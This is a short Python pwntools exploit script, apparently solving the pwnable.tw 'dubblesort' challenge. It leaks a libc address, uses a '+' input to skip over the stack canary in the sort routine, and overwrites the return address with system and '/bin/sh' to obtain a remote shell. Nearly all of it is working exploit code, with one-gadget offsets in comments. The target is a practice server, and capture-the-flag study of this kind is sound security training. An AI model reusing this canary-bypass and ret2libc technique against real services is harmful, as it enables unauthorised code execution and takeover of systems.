from pwn import *

if __name__ == '__main__':        
    context.log_level = 'debug'
    context.arch = 'amd64'
    LOCAL = 0
    DEBUG = 0

    # functions for quick script
    s       = lambda data               :t.send(str(data))       
    sa      = lambda delim,data         :t.sendafter(str(delim), str(data)) 
    sl      = lambda data               :t.sendline(str(data)) 
    sla     = lambda delim,data         :t.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :t.recv(numb)
    ru      = lambda delims, drop=True  :t.recvuntil(delims, drop)
    irt     = lambda                    :t.interactive()

    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
    # x64 below
    #16_04_magic = [0x45216,0x4526a,0xf02a4,0xf1147]

    #18_04_magic = [0x4f2c5,0x4f322,0x10a38c]

    if LOCAL:
        #t = process('./pwn',env={'LD_PRELOAD':'./libc-2.23.so'})
        t = remote('192.168.5.188', 9999)
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:

        t = remote('chall.pwnable.tw', 10101)
        libc = ELF('libc_32.so.6')
    
    


    def debug():
        raw_input('go?')


    debug()
    sla('name :',cyclic(24))
    t.recvn(30)
    addr_libc = uu32(t.recvn(4)) - 0xa - 0x1b0000
    leak("addr_libc", addr_libc)

    

    sla('sort :', '35')
    def sort(num):
        sla('number : ', num)


    for i in range(24):
        sort(0)

    sort('+')
    for i in range(9):
        sort(addr_libc + libc.symbols['system'])

    sort(addr_libc + next(libc.search('/bin/sh')))





















    irt()

